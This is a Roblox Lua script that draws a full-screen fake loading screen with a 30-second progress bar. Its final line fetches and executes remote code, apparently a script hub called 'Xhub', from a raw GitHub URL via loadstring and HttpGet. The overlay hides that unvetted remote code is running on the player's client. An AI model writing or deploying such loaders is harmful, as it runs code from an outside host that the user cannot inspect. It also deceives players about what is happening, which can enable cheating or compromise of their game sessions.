
-- Services
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

-- Setup GUI
local player = Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FakeLoadingScreen"
screenGui.DisplayOrder = 999
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Background
local background = Instance.new("Frame")
background.Size = UDim2.new(1, 0, 1, 0)
background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
background.BorderSizePixel = 0
background.Parent = screenGui

-- Loading bar frame
local loadingFrame = Instance.new("Frame")
loadingFrame.AnchorPoint = Vector2.new(0.5, 0.5)
loadingFrame.Position = UDim2.new(0.5, 0, 0.8, 0)
loadingFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = background

-- Progress bar
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.BorderSizePixel = 0
progressBar.Parent = loadingFrame

-- Loading text
local loadingText = Instance.new("TextLabel")
loadingText.AnchorPoint = Vector2.new(0.5, 0.5)
loadingText.Position = UDim2.new(0.5, 0, 0.7, 0)
loadingText.Size = UDim2.new(0.4, 0, 0.05, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.Font = Enum.Font.GothamBold
loadingText.Text = "Loading..."
loadingText.TextScaled = true
loadingText.Parent = background

-- Animate progress bar (30 seconds)
local tweenInfo = TweenInfo.new(30, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local goal = { Size = UDim2.new(1, 0, 1, 0) }
TweenService:Create(progressBar, tweenInfo, goal):Play()

-- Auto cleanup when done
task.delay(30, function()
	if screenGui then
		screenGui:Destroy()
	end
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/HydroDom/Xhub/refs/heads/main/XhubMAIN.lua"))()
